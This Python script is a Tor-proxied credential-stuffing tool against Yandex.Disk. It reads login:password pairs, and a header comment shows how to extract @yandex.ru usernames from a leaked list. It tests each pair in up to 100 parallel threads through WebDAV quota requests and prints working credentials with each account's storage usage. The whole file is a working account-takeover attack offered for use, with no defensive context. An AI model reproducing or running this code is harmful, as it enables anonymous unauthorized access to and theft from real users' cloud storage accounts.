#!/usr/bin/python3
#coding: utf-8
#
# Need Tor SOCKS proxy listen on port 9050 
# cat notsortlist.txt | grep @yandex.ru | perl -nle 'print if m{^[[:ascii:]]+$}' | sed 's/@yandex.ru//' >> brut.txt
#
import requests
import xml.etree.ElementTree as ET
from hurry.filesize import size
from optparse import OptionParser
import socket
import socks
import threading

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

class YaDiskException(Exception):
    """Common exception class for YaDisk. Arg 'code' have code of HTTP Error."""
    code = None

    def __init__(self, code, text):
        super(YaDiskException, self).__init__(text)
        self.code = code

    def __str__(self):
        return "%d. %s" % (self.code, super(YaDiskException, self).__str__())

class YaDiskXML(object):
    namespaces = {'d': "DAV:"}

    def find(self, node, path):
        """Wrapper for lxml`s find."""

        return node.find(path, namespaces=self.namespaces)

    def xpath(self, node, path):
        """Wrapper for lxml`s xpath."""

        return node.xpath(path, namespaces=self.namespaces)

class YaDisk(object):
    """Main object for work with Yandex.disk."""

    login = None
    password = None
    url = "https://webdav.yandex.ru/"
    namespaces = {'d': 'DAV:'}

    def __init__(self, login, password):
        super(YaDisk, self).__init__()
        self.login = login
        self.password = password
        if self.login is None or self.password is None:
            raise Exception("Please, set login and password to Yandex.Disk.")

    def _sendRequest(self, type, addUrl="/", addHeaders={}, data=None):
        headers = {"Accept": "*/*"}
        headers.update(addHeaders)
        url = self.url + addUrl
        req = requests.Request(type, url, headers=headers, auth=(self.login, self.password), data=data)
        with requests.Session() as s:
            return s.send(req.prepare())
    def df(self):
        """Return dict with size of Ya.Disk. Keys: 'available', 'used'."""

        def parseContent(content):
            root = ET.fromstring(content)
            return {
                'available': root.find(".//d:quota-available-bytes", namespaces=self.namespaces).text,
                'used': root.find(".//d:quota-used-bytes", namespaces=self.namespaces).text
            }

        data = """
<D:propfind xmlns:D="DAV:">
  <D:prop>
    <D:quota-available-bytes/>
    <D:quota-used-bytes/>
  </D:prop>
</D:propfind>
        """
        resp = self._sendRequest("PROPFIND", "/", {'Depth': 0}, data)
        if resp.status_code == 207:
            return parseContent(resp.content)
        else:
            raise YaDiskException(resp.status_code, resp.content)

def brute(username, password):
    try:
        disk = YaDisk(username, password)
        a = disk.df()
        print('Used: '+size(int(a['used']))+' Summary size: '+ size(int(a['used'])+int(a['available'])) + " Login: " + username + " Password: " + password)
    except:
        #pass
        print ('Error : ' + username + ' ' + password, end="\r")

def main():
    parser = OptionParser(usage="usage: python3 <program name>.py -p <password file>")
    parser.add_option("-p", type="string",
                      help="Enter password file",
                      dest="passFile")
    (options, args) = parser.parse_args()

    if not options.passFile:
        parser.print_help()
    else:
        with open(options.passFile) as f:
            for line in f.readlines():
                username = line.split(':')[0]
                password = line.split(':')[1].strip('\r').strip('\n') if len(line.split(':')[1].strip('\r').strip('\n')) > 1 else 'null'
                while threading.active_count()>100:
                    pass
                t = threading.Thread(target = brute,args=(username, password))
                t.start()

main()
